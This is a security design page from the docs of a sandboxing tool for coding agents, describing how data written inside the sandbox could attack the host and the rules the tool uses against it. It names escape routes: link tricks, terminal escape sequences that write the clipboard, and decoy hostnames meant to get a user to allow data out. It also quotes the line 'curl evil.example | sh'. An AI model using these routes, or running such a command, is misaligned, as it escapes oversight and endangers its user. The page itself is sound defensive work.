# Data from the sandbox is untrusted on the host

jailwick's CLI and app run on your Mac and read some data that comes from the sandbox, to show it
to you. Anything a process in the sandbox can write can be crafted to trick whatever reads it. So
jailwick reads that data the way a server reads requests: as input, never as instructions, and
never trusting its shape or size.

This page explains what that data is, what could go wrong, the rules jailwick follows, and what
changes for you (nothing in normal use). It is about **jailwick's own plumbing**. Your project's
code, including what Claude writes, is a different subject: jailwick never runs it on your Mac.
When *you* run it there, see [HOST-EXECUTION.md](HOST-EXECUTION.md).

## Two kinds of sandbox output

| | Your project's code | jailwick's data from the sandbox |
|---|---|---|
| Examples | `src/login.ts`, tests, `package.json`, `.husky/pre-commit` | handoff request files, session and worktree names, conversation titles, the agent's answers, hosts the proxy refused |
| Read or run on your Mac by | **you**, when you open, build or run it | **jailwick**, automatically, whenever you run `jw sessions`, `jw handoffs` or `jw blocked`, or open the app |
| Covered by | [HOST-EXECUTION.md](HOST-EXECUTION.md) | this page |

## What jailwick reads, and how each could be abused

1. **Handoff requests** (`<handoff folder>/to-<repo>/*.md`, `done/`). The sandbox writes them, so it
   can also put other things there.
   - A link to `/dev/zero` or a named pipe would make `jw handoffs`, and the app (which refreshes
     every few seconds), hang or exhaust memory.
   - A link to one of your files would make jailwick show its matching lines (`from:`,
     `subject:`) in the list. Only you see them, so this confuses rather than leaks.
2. **The handoff `README.md` jailwick writes.** jailwick creates it when the folder is new. If the
   sandbox replaces it with a dangling link, say to `~/.zshenv`, a write that follows links would
   create that file on your Mac. Every new terminal would then try to run the README as shell
   commands. The content is fixed, so the harm is limited, but the sandbox would choose where the
   host writes.
3. **Text printed in your terminal.** Session and worktree names, handoff subjects, conversation
   titles. Text can carry **terminal escape sequences**:
   - hide or fake lines of `jw` output;
   - change the window title;
   - in iTerm2 and many other terminals, **write your clipboard** (OSC 52). For example, a
     session's name could put `curl evil.example | sh` on your clipboard for you to paste later.
4. **The agent's answers** (`status`, `sessions`, `ports`, `history`, `verify`). The agent binary
   is jailwick's, but what it reports (processes, names, conversations) comes from inside the
   sandbox. A process can inflate it, with thousands of fake sessions or huge names, and the app
   asks every few seconds.
5. **Hosts the proxy refused** (`jw blocked`, the Network page). The sandbox chooses which hosts it
   tries.
   - It can try a name full of escape sequences (point 3).
   - It can try a harmless-looking host such as `cdn-npmjs-mirror.com`, so that you click
     **Allow** and open a way out for its data. Rules can't fix that one: check a host before you
     allow it, and prefer allowing it for one project only.

The app's pages already escape all text (Svelte does by default, and no view renders raw HTML),
so points 3 and 4 concern the terminal and the server, not the page.

## The rules

All of it goes through one small package, `internal/untrusted`, so each reader follows the same
rules:

1. **Never follow a link** inside a folder the sandbox can write. Read regular files only.
   Pipes and devices are refused without waiting on them. Create files only where nothing
   exists yet, never writing through an existing path, even a broken link.
2. **Bounded reads.**

   | What | Limit |
   |---|---|
   | a handoff, to list it | the first 64 KB |
   | a handoff, to show it | the first 1 MB, then "only the first MB is shown" |
   | requests per inbox | 1,000 |
   | an agent answer | 16 MB, else a clear error |
   | refused hosts collected | 5,000 |

3. **Sandbox text is data.** Control characters, escape sequences included, and invisible
   text-direction marks are removed from it before anything prints it. Tabs, new lines, accents
   and emoji stay. The agent's answers are cleaned once, where they are read, so every command
   and the app get clean text. Refused hosts are kept only when they are real host names.
4. **One writer per folder**, for new features: a folder is written by the host, by the proxy or
   by the sandbox, never by two of them. Whoever reads it knows who wrote it and trusts it
   accordingly.

Where each rule applies today:

| Reader | Rules |
|---|---|
| Listing handoffs (`jw handoffs`, the workspace page) | 1, 2, 3 |
| Showing one handoff (the app's request modal) | 1, 2, 3; the file must be a request of that folder |
| Creating the handoff README | 1 |
| Agent answers, for every command and page that uses them | 2, 3 |
| Refused hosts (`jw blocked`, the Network page) | 2, 3 |

One deliberate exception: **`jw logs`** shows container output as it is, like `docker logs`,
because apps colour their logs with the same escape codes. Read untrusted logs in the app, or pipe
them through `cat -v`.

## What changes for you

Nothing, in normal use:

| Area | Normal use | What changes |
|---|---|---|
| Handoffs | Sessions write ordinary `.md` files | Nothing. Links inside the folder are skipped. A handoff folder you configured as a link still works, because only the entries inside it are checked. |
| Large or many handoffs | Requests are a few KB | Only past the limits above: a cut-off note, or the newest 1,000 per inbox |
| Terminal output | Names and subjects with accents and emoji | Unchanged. Only invisible control characters are removed, and jailwick's own colours aren't affected. |
| The handoff README | Created once in a new folder | Same. If anything is already at that path, jailwick leaves it alone. |
| Agent answers | A few KB | No visible change. An answer over 16 MB is refused with an error. |
| Refused hosts | Real host names | Unchanged. Garbage that isn't a host name isn't listed. |
